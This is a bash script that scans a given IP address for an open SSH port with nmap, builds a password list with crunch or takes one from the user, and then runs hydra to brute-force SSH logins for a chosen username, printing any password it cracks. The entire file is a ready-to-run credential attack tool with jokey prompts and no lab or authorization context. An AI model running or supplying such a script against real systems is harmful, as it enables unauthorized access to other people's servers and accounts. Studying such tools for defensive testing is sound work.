#!/bin/bash

# Get ip from user
IP=$1

# Check if SSH is open
output=$(nmap $IP -p 22 | grep open)
if [ "$output" ]
then
	echo "SSH (port 22) is open in the provided IP address: $IP"
	
	# Ask if user would like to run BF attack
	read -p "Would you like to run a brute force attack on this IP address? (y/n) " input_bf
	
	if [ "$input_bf" == "y" ]
	then
		# Get username
		read -p "Login name: " login
	
		# Let user choose to use crunch or use password list
		read -p "Do you want to use crunch or a password list? (crunch/list) " input_cl
		if [ "$input_cl" == "crunch" ]
		then
			# Generate password list using crunch
			read -p "Min characters: " min
			read -p "Max characters: " max
			read -p "Symbols to use: " symbols
					
			crunch $min $max $symbols > crunch_passwords.lst
			echo "The passwords have been saved in crunch_passwords.lst"			
			echo "Running brute force attack now"
			
			passwords=crunch_passwords.lst
		else
			# Get password list
			read -p "Please enter the file path to your password list: " passwords
		fi
		# Brute force using hydra
		hydra_output=$(hydra -l $login -P $passwords $IP ssh -vV | grep password: | awk '{print $NF}')
		
		# Print to use if password exists
		if [ $hydra_output ]
		then 
			echo "A password has been found! It is: $hydra_output"
		else
			echo "Your passwords suck man"
		fi
	else
		echo "Why you so boring"
	fi
else
	echo "SSH (port 22) is NOT open in the provided IP address: $IP"
fi

echo "Thanks for using my program!"
